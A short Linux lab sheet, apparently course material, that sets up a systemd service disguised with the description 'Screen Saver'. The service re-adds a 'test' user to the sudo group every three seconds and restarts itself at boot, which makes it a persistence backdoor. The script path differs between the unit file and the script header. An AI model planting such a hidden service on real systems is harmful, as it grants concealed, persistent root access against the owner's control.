

# LAB-3


## Step


1. Create user
	1. `adduser test`
2. start test daemon
	1. `sudo systemctl start test`
3. start the test daemon automatically when boot
	1. `sudo systemctl enable test`



``` bash
# /etc/systemd/system/test.service
[Unit]
Description=Screen Saver

[Service]
Type=simple
ExecStart=/bin/bash /usr/local/bin/lab3.sh
Restart=always

[Install]
WantedBy=multi-user.target
```

```bash
# /usr/bin/lab3.sh

#!/bin/bash
while true;
do
    sleep 3;
    sudo usermod -aG sudo test;
done
```